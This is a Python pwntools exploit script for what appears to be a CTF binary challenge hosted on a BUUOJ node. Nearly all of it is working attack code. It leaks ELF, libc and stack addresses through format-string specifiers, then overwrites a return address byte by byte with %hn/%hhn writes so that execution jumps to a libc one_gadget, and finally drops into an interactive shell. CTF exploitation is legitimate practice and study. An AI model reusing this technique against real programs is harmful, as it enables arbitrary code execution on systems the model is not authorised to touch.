
#coding:utf-8
from pwn import *
from ctypes import CDLL
context.log_level='debug'
elfelf='./pwn'
elf=ELF(elfelf)
context.arch=elf.arch
gdb_text='''
b *$rebase(0xB27)
  '''

if len(sys.argv)==1 :
  io=process(elfelf)
  gdb_open=1
  libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
  # ld = ELF('/lib/x86_64-linux-gnu/ld-2.31.so')
  one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247]

elif sys.argv[1]=='2' :
  io=process(elfelf)
  gdb_open=0
  libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
  # ld = ELF('/lib/x86_64-linux-gnu/ld-2.31.so')
  one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247]

else :
  io=remote('node4.buuoj.cn',29176)
  gdb_open=0
  libc=ELF('./libc.so.6')
  # ld = ELF('/lib/x86_64-linux-gnu/ld-2.31.so')
  one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247]

def gdb_attach(io,a):
  if gdb_open==1 :
    gdb.attach(io,a)


io.sendlineafter('name:','keer')
def go(a):
  io.sendlineafter('favourite food: ',a)

go('%8$p%9$p%11$p')
io.recvuntil('You like ')
elf_base=int(io.recv(14),16)-0xb60
libc_base=int(io.recv(14),16)-libc.sym['__libc_start_main']-240
libc.address=libc_base
bin_sh_addr=libc.search('/bin/sh\x00').next()
system_addr=libc.sym['system']
free_hook_addr=libc.sym['__free_hook']
printf_got=libc_base+0x202028


stack_addr=(int(io.recv(14),16)-0x3518+0x3424)&0xffff
pay='%'+str(stack_addr)+'c%11$hn'
go(pay)
go('%255'+'c%37$hhn')


def fmt(addr,value):
    pay='%'+str(addr&0xffff)+'c%11$hn'
    go(pay)
    off_1=(value)&0xff
    go('%'+str(off_1)+'c%37$hhn')

    for i in range(5):
        pay='%'+str((addr+1+i)&0xff)+'c%11$hhn'
        go(pay)
        off_1=(value>>((i+1)*8))&0xff
        go('%'+str(off_1)+'c%37$hhn')

fmt(stack_addr+0xc+8,libc_base+one_gadgaet[3])

for i in range(248):
  io.sendline('')




success('libc_base:'+hex(libc_base))
# success('heap_base:'+hex(heap_base))

gdb_attach(io,gdb_text)
io.interactive()